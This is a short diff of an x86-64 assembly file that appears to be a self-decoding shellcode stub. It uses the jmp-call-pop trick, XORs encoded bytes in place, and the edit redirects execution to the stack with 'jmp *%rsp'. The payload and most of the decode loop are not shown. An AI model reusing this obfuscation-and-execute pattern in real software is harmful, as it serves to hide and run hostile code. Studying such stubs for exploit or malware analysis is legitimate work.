@@ -3,10 +3,11 @@
 _start:
 	push %rbp
     mov %rsp, %rbp
-    sub $0x100, %rsp
+    sub $0x200, %rsp
     jmp trois
 un:
 	pop %rsi
+	mov %rsp, %rsi
 deux:
 	xorl $0x7009282b, (%rsi)
 	add $4, %rsi
@@ -39,7 +40,7 @@ deux:
 	xorb $0x4e, (%rsi)
 	inc %rsi
 	xorb $0x44, (%rsi)
-	jmp quatre
+	jmp *%rsp
 trois:
 	call un
 quatre:
@@ -47,6 +48,5 @@ quatre:
 
 
 /*
-as ress.s -o ress.o
-ld ress.o -o ress
+as ress.s -o ress.o && ld ress.o -o ress
 */
